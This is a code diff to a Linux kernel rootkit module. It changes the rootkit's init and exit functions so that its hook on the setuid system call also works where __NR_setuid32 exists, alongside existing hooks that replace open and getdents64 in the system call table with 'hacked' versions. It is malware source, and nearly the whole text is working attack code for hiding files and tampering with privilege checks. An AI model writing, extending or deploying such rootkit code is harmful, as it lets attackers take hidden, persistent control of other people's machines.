@@ -176,7 +176,11 @@ int rootkit_init(void) { // Start lel rootkit
 
 	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
 	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
-	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
+	#if defined(__NR_setuid32)
+	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid32],hacked_setuid);
+	#else
+        orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
+	#endif
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
@@ -190,7 +194,12 @@ void rootkit_exit(void) {
 
 	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
 	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
+	#if defined(__NR_setuid32)
+	xchg(&system_call_table[__NR_setuid32],orig_setuid);
+	#else
 	xchg(&system_call_table[__NR_setuid],orig_setuid);
+	#endif
+
 	
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
